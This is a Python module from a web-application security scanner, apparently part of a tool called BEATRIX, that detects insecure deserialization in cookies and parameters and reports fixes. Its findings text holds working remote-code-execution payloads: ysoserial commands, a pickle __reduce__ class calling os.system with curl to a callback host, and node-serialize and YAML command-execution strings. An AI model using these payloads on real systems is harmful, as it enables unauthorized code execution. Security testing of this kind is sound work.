"""
BEATRIX Insecure Deserialization Scanner

Born from: OWASP WSTG-INPV-16 + ysoserial/PHPGGC/marshalsec research
https://portswigger.net/web-security/deserialization

TECHNIQUE:
1. Detect serialized data formats in cookies, parameters, headers, bodies
2. Identify serialization format (Java, PHP, Python pickle, .NET, Ruby Marshal, Node)
3. Test for integrity checks (modify and replay)
4. Generate format-specific payloads (DNS/HTTP callback for blind confirmation)
5. Type confusion / gadget chain exploitation

SERIALIZATION FORMAT SIGNATURES:
- Java:        \xac\xed\x00\x05 (magic bytes) or rO0AB (base64)
- PHP:         O:4:"User":3:{} or a:2:{i:0;s:5:"hello";}
- Python:      \x80\x04\x95 (pickle v4) or gASV (base64)
- .NET:        AAEAAAD///// (BinaryFormatter base64) or <root> (XML)
- Ruby:        \x04\x08 (Marshal.dump magic bytes)
- Node/JSON:   {"rce":"_$$ND_FUNC$$_function()..."}

SEVERITY: CRITICAL — deserialization ≈ instant RCE:
- Java: ysoserial gadget chains (Commons Collections, Spring, Hibernate)
- PHP: PHPGGC (Laravel, Symfony, WordPress, Magento)
- Python: pickle.loads → __reduce__ → os.system
- .NET: BinaryFormatter, ObjectStateFormatter, ViewState
- Ruby: Marshal.load → Gem::Requirement → Kernel#system

OWASP: WSTG-INPV-16 (Testing for HTTP Incoming Requests)
       A08:2021 - Software and Data Integrity Failures

MITRE: T1190 (Exploit Public-Facing Application)
       T1059 (Command and Scripting Interpreter)

CWE: CWE-502 (Deserialization of Untrusted Data)

REFERENCES:
- https://portswigger.net/web-security/deserialization
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Incoming_Requests
- https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
- https://github.com/frohoff/ysoserial
- https://github.com/ambionics/phpggc
"""

import base64
import random
import re
import string
from dataclasses import dataclass
from enum import Enum
from typing import Any, AsyncIterator, Dict, List, Optional, Tuple
from urllib.parse import unquote

try:
    import httpx
except ImportError:
    httpx = None

from beatrix.core.types import Confidence, Finding, Severity

from .base import BaseScanner, ScanContext

# =============================================================================
# DATA MODELS
# =============================================================================

class SerializationFormat(Enum):
    """Serialization format types"""
    JAVA = "java"
    PHP = "php"
    PYTHON_PICKLE = "python_pickle"
    DOTNET = "dotnet"
    RUBY_MARSHAL = "ruby_marshal"
    NODE_SERIALIZE = "node_serialize"
    YAML = "yaml"
    VIEWSTATE = "viewstate"
    UNKNOWN = "unknown"


class DeserialLocation(Enum):
    """Where serialized data was found"""
    COOKIE = "cookie"
    PARAMETER = "parameter"
    HEADER = "header"
    BODY = "body"
    HIDDEN_FIELD = "hidden_field"


@dataclass
class SerializedBlob:
    """A detected serialized data blob"""
    location: DeserialLocation
    name: str              # Cookie name, parameter name, etc.
    raw_value: str         # Raw value as found
    decoded_value: bytes   # Decoded bytes
    format: SerializationFormat
    is_base64: bool = False
    is_url_encoded: bool = False
    has_signature: bool = False  # MAC/HMAC present


# =============================================================================
# FORMAT DETECTION PATTERNS
# =============================================================================

# Java serialization magic: AC ED 00 05
JAVA_MAGIC = b'\xac\xed\x00\x05'
JAVA_MAGIC_B64 = 'rO0AB'

# PHP serialization patterns
PHP_PATTERNS = [
    re.compile(r'^[OaCidsb]:\d+:', re.ASCII),  # O:4:"User":2:{...}
    re.compile(r'^a:\d+:\{', re.ASCII),          # a:2:{i:0;s:5:"hello";}
    re.compile(r'^s:\d+:"', re.ASCII),           # s:5:"hello"
]

# Python pickle magic bytes (protocol 2+)
PICKLE_MAGIC_V2 = b'\x80\x02'
PICKLE_MAGIC_V4 = b'\x80\x04\x95'
PICKLE_MAGIC_B64 = ['gAJ', 'gASV']

# .NET BinaryFormatter
DOTNET_BF_B64 = 'AAEAAAD/////'

# .NET ViewState
VIEWSTATE_PATTERN = re.compile(r'__VIEWSTATE[^"]*"([^"]+)"')
VIEWSTATE_GENERATOR_PATTERN = re.compile(r'__VIEWSTATEGENERATOR[^"]*"([^"]+)"')
EVENTVALIDATION_PATTERN = re.compile(r'__EVENTVALIDATION[^"]*"([^"]+)"')

# Ruby Marshal magic: \x04\x08
RUBY_MARSHAL_MAGIC = b'\x04\x08'

# Node serialize (node-serialize package)
NODE_SERIALIZE_PATTERN = re.compile(r'_\$\$ND_FUNC\$\$_')

# YAML dangerous patterns
YAML_DANGEROUS = [
    '!!python/object',
    '!!python/object/apply',
    '!!ruby/object',
    '!!java/',
]


# =============================================================================
# SCANNER
# =============================================================================

class DeserializationScanner(BaseScanner):
    """
    Insecure Deserialization Scanner.

    Multi-phase approach:
    1. Detect serialized data in all inputs (cookies, params, headers, body)
    2. Identify serialization format (Java/PHP/Python/Ruby/.NET/Node)
    3. Test for integrity checks (can we modify and replay?)
    4. Generate detection payloads (DNS/HTTP callback probes)
    5. Report findings with format-specific remediation
    """

    name = "deserialization"
    description = "Insecure Deserialization Scanner"
    version = "1.0.0"

    checks = [
        "detect_serialization",
        "java_deserialization",
        "php_deserialization",
        "python_pickle",
        "dotnet_viewstate",
        "ruby_marshal",
        "node_deserialize",
        "yaml_deserialize",
    ]

    owasp_category = "WSTG-INPV-16"
    mitre_technique = "T1190"

    def __init__(self, config: Optional[Dict[str, Any]] = None):
        super().__init__(config)
        self.collaborator_domain = self.config.get("collaborator", "")
        self.canary = "BTRX" + "".join(random.choices(string.ascii_lowercase + string.digits, k=10))

    # =========================================================================
    # FORMAT DETECTION
    # =========================================================================

    def _detect_format(self, data: bytes) -> SerializationFormat:
        """Detect serialization format from raw bytes"""

        # Java
        if data[:4] == JAVA_MAGIC:
            return SerializationFormat.JAVA

        # Ruby Marshal
        if data[:2] == RUBY_MARSHAL_MAGIC:
            return SerializationFormat.RUBY_MARSHAL

        # Python pickle
        if data[:3] == PICKLE_MAGIC_V4 or data[:2] == PICKLE_MAGIC_V2:
            return SerializationFormat.PYTHON_PICKLE

        # .NET BinaryFormatter
        if data[:7] == b'\x00\x01\x00\x00\x00\xff\xff':
            return SerializationFormat.DOTNET

        # Try as text
        try:
            text = data.decode('utf-8', errors='replace')

            # PHP
            for pattern in PHP_PATTERNS:
                if pattern.match(text):
                    return SerializationFormat.PHP

            # Node serialize
            if NODE_SERIALIZE_PATTERN.search(text):
                return SerializationFormat.NODE_SERIALIZE

            # YAML dangerous
            for yd in YAML_DANGEROUS:
                if yd in text:
                    return SerializationFormat.YAML
        except Exception:
            pass

        return SerializationFormat.UNKNOWN

    def _detect_format_b64(self, data: str) -> Optional[SerializationFormat]:
        """Detect format from base64-encoded data"""
        stripped = data.strip()

        if stripped.startswith(JAVA_MAGIC_B64):
            return SerializationFormat.JAVA

        if stripped.startswith(DOTNET_BF_B64):
            return SerializationFormat.DOTNET

        for prefix in PICKLE_MAGIC_B64:
            if stripped.startswith(prefix):
                return SerializationFormat.PYTHON_PICKLE

        # Try decoding
        try:
            decoded = base64.b64decode(stripped)
            fmt = self._detect_format(decoded)
            if fmt != SerializationFormat.UNKNOWN:
                return fmt
        except Exception:
            pass

        return None

    def _try_decode(self, value: str) -> Tuple[bytes, bool, bool]:
        """Try to decode value (URL decode → base64 decode). Returns (bytes, is_b64, is_url_encoded)"""
        # URL decode
        url_decoded = unquote(value)
        is_url = url_decoded != value

        # Try base64
        try:
            decoded = base64.b64decode(url_decoded)
            return decoded, True, is_url
        except Exception:
            pass

        # Try URL-safe base64
        try:
            decoded = base64.urlsafe_b64decode(url_decoded + "==")
            if len(decoded) > 4:
                return decoded, True, is_url
        except Exception:
            pass

        return url_decoded.encode('utf-8', errors='replace'), False, is_url

    # =========================================================================
    # SERIALIZED DATA DISCOVERY
    # =========================================================================

    def _scan_value_for_serialization(
        self, name: str, value: str, location: DeserialLocation
    ) -> Optional[SerializedBlob]:
        """Check if a value contains serialized data"""
        if not value or len(value) < 4:
            return None

        # Check for base64-encoded format signatures first
        b64_format = self._detect_format_b64(value)
        if b64_format:
            decoded, is_b64, is_url = self._try_decode(value)
            return SerializedBlob(
                location=location,
                name=name,
                raw_value=value[:500],
                decoded_value=decoded[:500],
                format=b64_format,
                is_base64=is_b64,
                is_url_encoded=is_url,
            )

        # Check raw bytes
        decoded, is_b64, is_url = self._try_decode(value)
        raw_format = self._detect_format(decoded)
        if raw_format != SerializationFormat.UNKNOWN:
            return SerializedBlob(
                location=location,
                name=name,
                raw_value=value[:500],
                decoded_value=decoded[:500],
                format=raw_format,
                is_base64=is_b64,
                is_url_encoded=is_url,
            )

        # Check for ViewState (special case in hidden fields)
        if "VIEWSTATE" in name.upper() or value.startswith("/wE"):
            return SerializedBlob(
                location=location,
                name=name,
                raw_value=value[:500],
                decoded_value=decoded[:500],
                format=SerializationFormat.VIEWSTATE,
                is_base64=True,
                is_url_encoded=is_url,
            )

        return None

    def _discover_in_cookies(self, context: ScanContext) -> List[SerializedBlob]:
        """Scan all cookies for serialized data"""
        blobs = []
        for name, value in context.cookies.items():
            blob = self._scan_value_for_serialization(name, value, DeserialLocation.COOKIE)
            if blob:
                blobs.append(blob)
        return blobs

    def _discover_in_parameters(self, context: ScanContext) -> List[SerializedBlob]:
        """Scan URL and body parameters for serialized data"""
        blobs = []
        for name, value in context.parameters.items():
            blob = self._scan_value_for_serialization(name, value, DeserialLocation.PARAMETER)
            if blob:
                blobs.append(blob)
        return blobs

    # =========================================================================
    # INTEGRITY TESTING
    # =========================================================================

    async def _test_integrity(
        self, context: ScanContext, blob: SerializedBlob
    ) -> bool:
        """Test if serialized data has integrity checks (MAC/HMAC)"""
        # Modify one byte in the middle of the value
        modified = bytearray(blob.decoded_value)
        if len(modified) > 10:
            midpoint = len(modified) // 2
            modified[midpoint] = (modified[midpoint] + 1) % 256

        # Re-encode
        if blob.is_base64:
            mod_value = base64.b64encode(bytes(modified)).decode()
        else:
            mod_value = bytes(modified).decode('latin-1')

        if blob.is_url_encoded:
            from urllib.parse import quote
            mod_value = quote(mod_value)

        # Replay with modified data
        try:
            if blob.location == DeserialLocation.COOKIE:
                resp = await self.get(
                    context.url,
                    headers={"Cookie": f"{blob.name}={mod_value}"},
                )
            elif blob.location == DeserialLocation.PARAMETER:
                resp = await self.get(
                    context.url,
                    params={blob.name: mod_value},
                )
            else:
                return True  # Can't easily test, assume protected

            # If we get a 200 back, no integrity check
            if resp.status_code == 200:
                return False  # NOT protected

            # 400/403/500 with "invalid" or "tampered" message = protected
            if resp.status_code in (400, 403, 500):
                body = resp.text.lower()
                if any(kw in body for kw in ["invalid", "tamper", "signature", "mac", "hmac", "integrity"]):
                    return True

        except Exception:
            pass

        return True  # Assume protected on error

    # =========================================================================
    # FORMAT-SPECIFIC PAYLOAD GENERATION
    # =========================================================================

    def _build_java_detection_payload(self) -> Optional[str]:
        """Build Java deserialization detection payload (DNS callback)"""
        if not self.collaborator_domain:
            return None

        # Minimal Java serialized object that triggers DNS lookup
        # This is the URLDNS gadget chain (no dependency needed)
        # For actual exploitation, use ysoserial externally
        return (
            f"Note: Use ysoserial to generate payloads:\n"
            f"  java -jar ysoserial.jar URLDNS 'http://{self.canary}.{self.collaborator_domain}'\n"
            f"  java -jar ysoserial.jar CommonsCollections6 'curl http://{self.canary}.{self.collaborator_domain}'\n"
            f"  java -jar ysoserial.jar Jdk7u21 'id'\n"
            f"  java -jar ysoserial.jar Spring1 'id'"
        )

    def _build_php_detection_payload(self) -> str:
        """Build PHP deserialization test payload"""
        # Modify existing PHP serialized object to test for type juggling
        return (
            f'O:8:"stdClass":1:{{s:4:"test";s:{len(self.canary)}:"{self.canary}";}}'
        )

    def _build_python_pickle_payload(self) -> str:
        """Build Python pickle detection payload (base64)"""
        if self.collaborator_domain:
            # pickle payload that calls urllib.request.urlopen
            return (
                f"Note: Generate with:\n"
                f"  import pickle, os\n"
                f"  class RCE:\n"
                f"    def __reduce__(self):\n"
                f"      return os.system, ('curl http://{self.canary}.{self.collaborator_domain}',)\n"
                f"  payload = base64.b64encode(pickle.dumps(RCE())).decode()"
            )
        return "# Pickle payloads require collaborator domain for safe detection"

    def _build_viewstate_info(self, blob: SerializedBlob) -> str:
        """Analyze ViewState for security properties"""
        info = []
        raw = blob.raw_value

        # Check if MAC is present (signed ViewState)
        # Unsigned ViewState starts with /wEP and is shorter
        # Signed ViewState has 20+ byte HMAC at the end
        try:
            decoded = base64.b64decode(raw)
            if len(decoded) > 20:
                # Last 20 bytes could be HMAC-SHA1
                info.append(f"ViewState length: {len(decoded)} bytes")

                # Check for encryption indicator
                if decoded[0:2] == b'\xff\x01':
                    info.append("ViewState appears ENCRYPTED (good)")
                else:
                    info.append("ViewState appears UNENCRYPTED (bad)")

        except Exception:
            info.append("Could not decode ViewState")

        return "\n".join(info)

    # =========================================================================
    # MAIN SCAN
    # =========================================================================

    def _inject_poc_server_collaborator(self, context: ScanContext) -> None:
        """Use local PoC server as collaborator if available and no external one configured."""
        poc_server = context.extra.get("poc_server") if context.extra else None
        if poc_server and not self.collaborator_domain:
            self.collaborator_domain = f"{poc_server.host}:{poc_server.port}"
            self.canary = "BTRX" + "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
            poc_server.register_oob_payload(self.canary, {"scanner": "deserialization", "url": context.url})

    async def scan(self, context: ScanContext) -> AsyncIterator[Finding]:
        """Full deserialization vulnerability scan"""

        # Automatically use local PoC server for OOB detection
        self._inject_poc_server_collaborator(context)

        all_blobs: List[SerializedBlob] = []

        # Phase 1: Discover serialized data in cookies
        all_blobs.extend(self._discover_in_cookies(context))

        # Phase 2: Discover in parameters
        all_blobs.extend(self._discover_in_parameters(context))

        # Phase 3: Analyze each discovered blob
        for blob in all_blobs:
            severity = Severity.HIGH
            extra_info = ""

            # Test integrity
            has_integrity = await self._test_integrity(context, blob)
            if not has_integrity:
                severity = Severity.CRITICAL
                extra_info += "⚠️ NO INTEGRITY CHECK — serialized data can be freely modified!\n\n"
            else:
                extra_info += "Integrity check detected (MAC/HMAC). Exploitation requires key.\n\n"

            # Format-specific details
            if blob.format == SerializationFormat.JAVA:
                extra_info += (
                    "JAVA SERIALIZATION DETECTED.\n"
                    "This is almost always exploitable via gadget chains.\n\n"
                    + (self._build_java_detection_payload() or "")
                )
            elif blob.format == SerializationFormat.PHP:
                extra_info += (
                    "PHP SERIALIZATION DETECTED.\n"
                    "Test with PHPGGC for framework-specific gadget chains.\n"
                    f"Modified payload: {self._build_php_detection_payload()}\n\n"
                    "Common chains: Laravel (RCE), Symfony (RCE), WordPress (file delete)"
                )
            elif blob.format == SerializationFormat.PYTHON_PICKLE:
                extra_info += (
                    "PYTHON PICKLE DETECTED.\n"
                    "pickle.loads() is inherently unsafe — RCE via __reduce__.\n\n"
                    + self._build_python_pickle_payload()
                )
            elif blob.format == SerializationFormat.VIEWSTATE:
                extra_info += (
                    ".NET VIEWSTATE DETECTED.\n"
                    + self._build_viewstate_info(blob) + "\n\n"
                    "If ViewState MAC validation is disabled, use ysoserial.net:\n"
                    "  ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c 'cmd /c whoami'"
                )
            elif blob.format == SerializationFormat.RUBY_MARSHAL:
                extra_info += (
                    "RUBY MARSHAL DETECTED.\n"
                    "Marshal.load is unsafe — RCE via Gem::Requirement gadget chain.\n"
                    "Test: ERB template injection via deserialized object."
                )
            elif blob.format == SerializationFormat.NODE_SERIALIZE:
                extra_info += (
                    "NODE-SERIALIZE DETECTED.\n"
                    "The node-serialize package executes functions during deserialization.\n"
                    'Payload: {"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}()"}'
                )
            elif blob.format == SerializationFormat.YAML:
                extra_info += (
                    "UNSAFE YAML DESERIALIZATION DETECTED.\n"
                    "YAML load() with FullLoader/UnsafeLoader allows arbitrary object creation.\n"
                    "Python: !!python/object/apply:os.system ['id']\n"
                    "Ruby:   !!ruby/object:Gem::Installer\\ni: x\\n"
                )

            yield self.create_finding(
                title=f"Serialized Data Detected: {blob.format.value} in {blob.location.value}",
                severity=severity,
                confidence=Confidence.CERTAIN,
                url=context.url,
                description=(
                    f"Serialized {blob.format.value} data found in {blob.location.value} '{blob.name}'.\n\n"
                    f"Format: {blob.format.value}\n"
                    f"Location: {blob.location.value}\n"
                    f"Base64 encoded: {blob.is_base64}\n"
                    f"URL encoded: {blob.is_url_encoded}\n"
                    f"Has integrity check: {has_integrity}\n\n"
                    f"{extra_info}"
                ),
                evidence=blob.raw_value[:1000],
                remediation=(
                    "1. Avoid accepting serialized objects from untrusted sources\n"
                    "2. Use safe alternatives: JSON, Protocol Buffers, MessagePack\n"
                    "3. If serialization required, implement integrity checks (HMAC)\n"
                    "4. Java: Use allowlisting ObjectInputStream filters (JEP 290)\n"
                    "5. PHP: Use json_encode/json_decode instead of serialize/unserialize\n"
                    "6. Python: Use json.loads instead of pickle.loads\n"
                    "7. .NET: Avoid BinaryFormatter, use DataContractSerializer\n"
                    "8. .NET ViewState: Ensure MAC validation is enabled"
                ),
                references=[
                    "https://portswigger.net/web-security/deserialization",
                    "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html",
                    "https://github.com/frohoff/ysoserial",
                    "https://github.com/ambionics/phpggc",
                ],
            )

        # Passive scan
        async for finding in self.passive_scan(context):
            yield finding

    async def passive_scan(self, context: ScanContext) -> AsyncIterator[Finding]:
        """Detect deserialization indicators from response"""
        if not context.response:
            return

        body = context.response.body if hasattr(context.response, 'body') else ""

        # Detect ViewState in HTML
        vs_match = VIEWSTATE_PATTERN.search(body)
        if vs_match:
            vs_value = vs_match.group(1)
            self._scan_value_for_serialization(
                "__VIEWSTATE", vs_value, DeserialLocation.HIDDEN_FIELD
            )

            vsg_match = VIEWSTATE_GENERATOR_PATTERN.search(body)
            generator = vsg_match.group(1) if vsg_match else "unknown"

            yield self.create_finding(
                title=".NET ViewState Detected in Response",
                severity=Severity.MEDIUM,
                confidence=Confidence.CERTAIN,
                url=context.url,
                description=(
                    f".NET ViewState found in form.\n"
                    f"ViewState Generator: {generator}\n"
                    f"ViewState length: {len(vs_value)} chars\n\n"
                    "If MAC validation is disabled (enableViewStateMac=false), "
                    "this is exploitable for RCE via ysoserial.net."
                ),
                evidence=f"__VIEWSTATE={vs_value[:200]}...",
                remediation="Ensure ViewState MAC validation is enabled and use .NET 4.5+ built-in protection.",
            )

        # Detect serialization error messages
        deser_errors = [
            (r"(java\.io\.ObjectInputStream|ClassNotFoundException|InvalidClassException)",
             "Java Deserialization Error", SerializationFormat.JAVA),
            (r"(unserialize\(\)|allowed_classes|__wakeup|__destruct)",
             "PHP Deserialization Error", SerializationFormat.PHP),
            (r"(pickle\.loads|_pickle\.UnpicklingError|Unpickler)",
             "Python Pickle Error", SerializationFormat.PYTHON_PICKLE),
            (r"(BinaryFormatter|ObjectStateFormatter|ViewState.*validation)",
             ".NET Deserialization Error", SerializationFormat.DOTNET),
            (r"(Marshal\.load|marshal data too short)",
             "Ruby Marshal Error", SerializationFormat.RUBY_MARSHAL),
        ]

        for pattern, title, fmt in deser_errors:
            if re.search(pattern, body, re.IGNORECASE):
                yield self.create_finding(
                    title=f"{title} Disclosed",
                    severity=Severity.MEDIUM,
                    confidence=Confidence.FIRM,
                    url=context.url,
                    description=(
                        f"Error message reveals {fmt.value} deserialization is in use. "
                        f"This confirms the attack surface for insecure deserialization."
                    ),
                    evidence=body[:500],
                    remediation="Suppress detailed error messages in production.",
                )
